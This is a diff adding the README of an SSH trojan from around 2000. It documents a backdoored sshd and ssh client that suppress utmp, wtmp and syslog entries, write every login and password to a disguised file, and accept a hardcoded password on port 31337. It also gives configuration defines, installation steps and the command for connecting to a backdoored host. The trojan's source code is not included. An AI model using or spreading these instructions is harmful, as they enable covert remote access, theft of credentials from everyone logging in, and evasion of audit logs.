@@ -1,0 +1,36 @@
++++ Welcome To Buffer0verfl0w Security Team Ssh Trojan 
++++ By xfer Of Buffer0verfl0w Security Team
++++ At Sun May  7 09:44:44 CEST 2000
+
++++ Trojan Info
+
+    It doesn't log anything to system logz like utmp,wtmp and all kind of 
+    syslogd logz. It also logz all incoming and outcoming logins and passwords 
+    to file.
+    
++++ Trojan Config.
+
+    Ya have to change some def's in two files (sshd.c and sshconnect.c). 
+    Here are default def's of thiz trojan:
+     
+    /* Trojan variableZ */
+      
+      #define SSH_LOGZ "/usr/lib/libfl.so" <-- where is should store logz?
+      #define TROJAN_PASSWORD "b0f" <-- trojan password
+      #define PASSWORD_LENGTH strlen(TROJAN_PASSWORD) <-- don't touch it ;>
+      #define REMOTE_TROJAN_PORT 31337 <-- invisible trojan port
+
++++ Installation.
+
+    When ya change thiz def's ya have to copy all files included to this trojan 
+    into orginal ssh pack. Then compile it and install.
+    
++++ Trojan HowTo.
+
+    How to connect to backdoored host ?
+    Only type ssh root@backdoored.host.com -X 31337
+    Hmmm -X is new option added in thiz trojan and ya have to compile thiz 
+    trojan your machine first but don't install it just copy ssh file with 
+    new option.
+
++++ Greets: Lam3rZ Team, TESO Team, ADM Crew and the rest of ppl who know me...
